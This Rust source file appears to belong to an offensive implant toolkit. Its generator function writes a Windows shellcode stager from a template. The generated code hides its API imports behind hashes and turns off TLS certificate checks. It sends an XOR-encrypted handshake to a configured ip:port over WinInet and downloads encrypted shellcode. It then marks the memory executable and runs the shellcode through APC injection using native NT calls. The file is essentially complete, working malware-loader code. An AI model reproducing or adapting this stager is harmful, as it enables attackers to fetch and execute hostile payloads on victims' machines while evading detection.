use super::utils::{djb2_hash, INSTANCE_TEMPLATE_PATH, TARGET_INSTANCE_PATH};
use crate::config::{GenerateArch, PulseConfig, Version};

pub fn generate_wininet_pulse(
    config: PulseConfig,
    _arch: GenerateArch,
    _version: &Version,
    _source: bool,
    tls: bool,
) -> anyhow::Result<()> {
    let template_path = std::path::Path::new(INSTANCE_TEMPLATE_PATH);
    if !template_path.exists() {
        anyhow::bail!("Instance template not found: {}", INSTANCE_TEMPLATE_PATH);
    }
    let template = std::fs::read_to_string(template_path)?;

    let url = &config.target;
    if url.is_empty() {
        anyhow::bail!("target url is empty.");
    }
    let colon_pos = url
        .find(':')
        .ok_or_else(|| anyhow::anyhow!("invalid target format, expected ip:port"))?;
    let (ip, port_str) = url.split_at(colon_pos);
    let port: u16 = port_str[1..].parse()?;

    let magic = djb2_hash(&config.flags.magic);
    let key = &config.key;
    let iv: String = key.chars().rev().collect();

    let key_bytes = format_byte_literals(key.as_bytes());
    let iv_bytes = format_byte_literals(iv.as_bytes());
    let ip_bytes = format_byte_literals(ip.as_bytes());

    // Build HTTP headers string for HttpSendRequestA: "Header1: Value1\r\nHeader2: Value2\r\n"
    let mut headers_str = String::new();
    for (k, v) in &config.http.headers {
        headers_str.push_str(&format!("{}: {}\r\n", k, v));
    }
    let headers_bytes = format_byte_literals(headers_str.as_bytes());

    let method_bytes = format_byte_literals(config.http.method.as_bytes());
    let path_bytes = format_byte_literals(config.http.path.as_bytes());

    // WinInet flags: INTERNET_FLAG_RELOAD always, plus INTERNET_FLAG_SECURE + cert ignore if tls
    let request_flags = if tls {
        // INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
        "0x00800000u32 | 0x80000000u32 | 0x00001000u32 | 0x00002000u32"
    } else {
        "0x80000000u32" // INTERNET_FLAG_RELOAD only
    };

    let start_method = format!(
        r#"    pub unsafe fn start(&self, _args: *mut c_void) {{
        fn xor_process(data: &mut [u8], key: &[u8], iv: &[u8], counter: &mut usize) {{
            for byte in data.iter_mut() {{
                *byte ^= key[*counter % key.len()] ^ iv[*counter % iv.len()];
                *counter += 1;
            }}
        }}

        // Load wininet.dll
        let dll_name: [u8; 12] = [b'w', b'i', b'n', b'i', b'n', b'e', b't', b'.', b'd', b'l', b'l', 0];
        let load_lib: FnLoadLibraryA = core::mem::transmute(self.kernel32.LoadLibraryA);
        let h_dll = load_lib(dll_name.as_ptr() as *mut u8);
        if h_dll.is_null() {{ return; }}
        let dll_base = h_dll as usize;

        // Resolve WinInet APIs via hash
        let p_internet_open: FnInternetOpenA = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("InternetOpenA") as usize));
        let p_internet_connect: FnInternetConnectA = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("InternetConnectA") as usize));
        let p_http_open_request: FnHttpOpenRequestA = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("HttpOpenRequestA") as usize));
        let p_http_send_request: FnHttpSendRequestA = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("HttpSendRequestA") as usize));
        let p_internet_read_file: FnInternetReadFile = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("InternetReadFile") as usize));
        let p_internet_close_handle: FnInternetCloseHandle = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("InternetCloseHandle") as usize));
        let p_internet_set_option: FnInternetSetOptionA = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("InternetSetOptionA") as usize));

        // User-Agent string
        let ua: [u8; 1] = [0]; // empty user agent

        // InternetOpenA(agent, INTERNET_OPEN_TYPE_DIRECT=1, null, null, 0)
        let h_internet = p_internet_open(
            ua.as_ptr() as PSTR,
            1u32,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            0u32,
        );
        if h_internet.is_null() {{ return; }}

        // InternetConnectA(hInternet, server, port, null, null, INTERNET_SERVICE_HTTP=3, 0, 0)
        let ip_addr: [u8; {ip_len}] = [{ip_bytes}, 0];
        let h_connect = p_internet_connect(
            h_internet,
            ip_addr.as_ptr() as PSTR,
            {port}u16,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            3u32,
            0u32,
            0usize,
        );
        if h_connect.is_null() {{
            p_internet_close_handle(h_internet);
            return;
        }}

        // HttpOpenRequestA(hConnect, method, path, version, null, null, flags, 0)
        let method: [u8; {method_len}] = [{method_bytes}, 0];
        let path: [u8; {path_len}] = [{path_bytes}, 0];
        let flags: DWORD = {request_flags};
        let h_request = p_http_open_request(
            h_connect,
            method.as_ptr() as PSTR,
            path.as_ptr() as PSTR,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            flags,
            0usize,
        );
        if h_request.is_null() {{
            p_internet_close_handle(h_connect);
            p_internet_close_handle(h_internet);
            return;
        }}

        {tls_ignore_cert}

        // Configuration
        let key: [u8; {key_len}] = [{key_bytes}];
        let iv: [u8; {iv_len}] = [{iv_bytes}];

        // Build handshake body: [start][magic:4][artifact_id:4][end]
        let mut body: [u8; 10] = [0; 10];
        body[0] = {start}u8;
        let m = {magic}u32.to_le_bytes();
        body[1] = m[0]; body[2] = m[1]; body[3] = m[2]; body[4] = m[3];
        let a = {artifact_id}u32.to_le_bytes();
        body[5] = a[0]; body[6] = a[1]; body[7] = a[2]; body[8] = a[3];
        body[9] = {end}u8;

        // Encrypt body
        let mut counter: usize = 0;
        xor_process(&mut body, &key, &iv, &mut counter);

        // HttpSendRequestA(hRequest, headers, headersLen, body, bodyLen)
        let headers: [u8; {headers_len}] = [{headers_bytes_val}];
        let ret = p_http_send_request(
            h_request,
            {headers_ptr},
            {headers_dword_len}u32,
            body.as_ptr() as PVOID,
            10u32,
        );
        if ret == 0 {{
            p_internet_close_handle(h_request);
            p_internet_close_handle(h_connect);
            p_internet_close_handle(h_internet);
            return;
        }}

        // Read response body: first 9 bytes header
        let mut resp: [u8; 9] = [0; 9];
        let mut offset = 0u32;
        while offset < 9 {{
            let mut bytes_read: DWORD = 0;
            let ret = p_internet_read_file(
                h_request,
                resp.as_mut_ptr().add(offset as usize) as PVOID,
                9 - offset,
                &mut bytes_read,
            );
            if ret == 0 || bytes_read == 0 {{
                p_internet_close_handle(h_request);
                p_internet_close_handle(h_connect);
                p_internet_close_handle(h_internet);
                return;
            }}
            offset += bytes_read;
        }}

        // Decrypt and validate response
        counter = 0;
        xor_process(&mut resp, &key, &iv, &mut counter);
        if resp[0] != {start}u8 {{
            p_internet_close_handle(h_request);
            p_internet_close_handle(h_connect);
            p_internet_close_handle(h_internet);
            return;
        }}
        let recv_magic = u32::from_le_bytes([resp[1], resp[2], resp[3], resp[4]]);
        let recv_len = u32::from_le_bytes([resp[5], resp[6], resp[7], resp[8]]);
        if recv_magic != {magic}u32 || recv_len == 0 {{
            p_internet_close_handle(h_request);
            p_internet_close_handle(h_connect);
            p_internet_close_handle(h_internet);
            return;
        }}

        // Allocate memory for shellcode
        let mut base_addr: PVOID = core::ptr::null_mut();
        let mut region_size: SIZE_T = recv_len as usize + 1;
        let nt_alloc: FnNtAllocateVirtualMemory =
            core::mem::transmute(self.ntdll.NtAllocateVirtualMemory);
        let status = nt_alloc(
            -1isize as HANDLE, &mut base_addr, 0, &mut region_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        );
        if status != STATUS_SUCCESS || base_addr.is_null() {{
            p_internet_close_handle(h_request);
            p_internet_close_handle(h_connect);
            p_internet_close_handle(h_internet);
            return;
        }}

        // Read shellcode via InternetReadFile
        let mut total_read: u32 = 0;
        while total_read < recv_len {{
            let mut bytes_read: DWORD = 0;
            let ret = p_internet_read_file(
                h_request,
                (base_addr as *mut u8).add(total_read as usize) as PVOID,
                recv_len - total_read,
                &mut bytes_read,
            );
            if ret == 0 || bytes_read == 0 {{
                p_internet_close_handle(h_request);
                p_internet_close_handle(h_connect);
                p_internet_close_handle(h_internet);
                return;
            }}
            total_read += bytes_read;
        }}
        p_internet_close_handle(h_request);
        p_internet_close_handle(h_connect);
        p_internet_close_handle(h_internet);

        // Decrypt shellcode
        xor_process(
            core::slice::from_raw_parts_mut(base_addr as *mut u8, recv_len as usize),
            &key, &iv, &mut counter,
        );

        // Change memory protection to executable
        let mut old_protect: ULONG = 0;
        let mut protect_base = base_addr;
        let mut protect_size = region_size;
        let nt_protect: FnNtProtectVirtualMemory =
            core::mem::transmute(self.ntdll.NtProtectVirtualMemory);
        nt_protect(
            -1isize as HANDLE, &mut protect_base, &mut protect_size,
            PAGE_EXECUTE_READ, &mut old_protect,
        );

        // Execute shellcode via APC injection
        let nt_create: FnNtCreateThreadEx =
            core::mem::transmute(self.ntdll.NtCreateThreadEx);
        let nt_queue: FnNtQueueApcThread =
            core::mem::transmute(self.ntdll.NtQueueApcThread);
        let nt_resume: FnNtAlertResumeThread =
            core::mem::transmute(self.ntdll.NtAlertResumeThread);
        let nt_wait: FnNtWaitForSingleObject =
            core::mem::transmute(self.ntdll.NtWaitForSingleObject);

        let mut thread_handle: HANDLE = core::ptr::null_mut();
        nt_create(
            &mut thread_handle, 0x1FFFFF, core::ptr::null_mut(),
            -1isize as HANDLE, base_addr, core::ptr::null_mut(),
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
            0, 0, 0, core::ptr::null_mut(),
        );
        if thread_handle.is_null() {{ return; }}

        nt_queue(
            thread_handle, base_addr,
            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
        );

        let mut suspend_count: ULONG = 0;
        nt_resume(thread_handle, &mut suspend_count);
        nt_wait(thread_handle, 0, core::ptr::null_mut());
    }}"#,
        ip_len = ip.len() + 1,
        ip_bytes = ip_bytes,
        port = port,
        key_len = key.len(),
        key_bytes = key_bytes,
        iv_len = iv.len(),
        iv_bytes = iv_bytes,
        method_len = config.http.method.len() + 1,
        method_bytes = method_bytes,
        path_len = config.http.path.len() + 1,
        path_bytes = path_bytes,
        headers_len = if headers_str.is_empty() {
            1
        } else {
            headers_str.len() + 1
        },
        headers_bytes_val = if headers_str.is_empty() {
            "0".to_string()
        } else {
            format!("{}, 0", headers_bytes)
        },
        headers_ptr = if headers_str.is_empty() {
            "core::ptr::null_mut()".to_string()
        } else {
            "headers.as_ptr() as PSTR".to_string()
        },
        headers_dword_len = if headers_str.is_empty() {
            0
        } else {
            headers_str.len()
        },
        request_flags = request_flags,
        tls_ignore_cert = if tls {
            r#"// Pre-set security flags to ignore certificate errors
        let mut sec_flags: DWORD = 0x00000080u32 | 0x00000100u32 | 0x00000200u32 | 0x00001000u32 | 0x00002000u32;
        p_internet_set_option(
            h_request,
            31u32,
            &mut sec_flags as *mut DWORD as PVOID,
            4u32,
        );"#
        } else {
            ""
        },
        start = config.flags.start,
        end = config.flags.end,
        magic = format!("0x{:08x}", magic),
        artifact_id = config.flags.artifact_id,
    );

    let instance_rs = format!("{}\n{}\n}}\n", template, start_method);
    let target_path = std::path::Path::new(TARGET_INSTANCE_PATH);
    std::fs::write(target_path, instance_rs)?;

    Ok(())
}

fn format_byte_literals(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| format!("0x{:02x}", b))
        .collect::<Vec<_>>()
        .join(", ")
}
